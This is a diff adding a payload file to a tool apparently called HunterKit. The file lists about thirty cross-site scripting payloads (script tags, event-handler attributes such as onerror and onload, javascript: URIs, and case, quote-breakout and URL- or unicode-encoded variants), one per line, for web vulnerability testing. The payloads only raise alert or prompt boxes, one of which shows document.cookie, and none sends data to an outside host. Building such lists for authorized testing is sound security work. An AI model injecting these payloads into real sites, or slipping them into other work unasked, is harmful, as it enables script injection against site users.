@@ -1,0 +1,38 @@
+# HunterKit Advanced Payload File
+# XSS vulnerability testing payloads
+# Developed by Kawindu Wijewardhane (@kawinduwijewardhane)
+# Add your custom payloads here - one payload per line
+# Lines starting with # are comments and will be ignored
+
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>prompt("XSS")</script>
+<script>confirm("XSS")</script>
+<img src=x onerror=alert("XSS")>
+<img src="x" onerror="alert(1)">
+<img/src=x onerror=alert(document.domain)>
+<img src=x onerror=prompt(document.cookie)>
+<svg onload=alert("XSS")>
+<svg/onload=alert(1)>
+<svg><script>alert("XSS")</script></svg>
+<svg onload=confirm("XSS")>
+<input autofocus onfocus=alert("XSS")>
+<select onfocus=alert("XSS") autofocus>
+<textarea onfocus=alert("XSS") autofocus>
+<details open ontoggle=alert("XSS")>
+<body onload=alert("XSS")>
+javascript:alert("XSS")
+JaVaScRiPt:alert("XSS")
+javascript:prompt("XSS")
+<ScRiPt>alert("XSS")</ScRiPt>
+"><script>alert("XSS")</script>
+'><script>alert('XSS')</script>
+</title><script>alert("XSS")</script>
+</textarea><script>alert("XSS")</script>
+<iframe src=javascript:alert("XSS")></iframe>
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<form><button formaction="javascript:alert('XSS')">
+%3Cscript%3Ealert("XSS")%3C/script%3E
+&lt;script&gt;alert("XSS")&lt;/script&gt;
+\u003cscript\u003ealert("XSS")\u003c/script\u003e
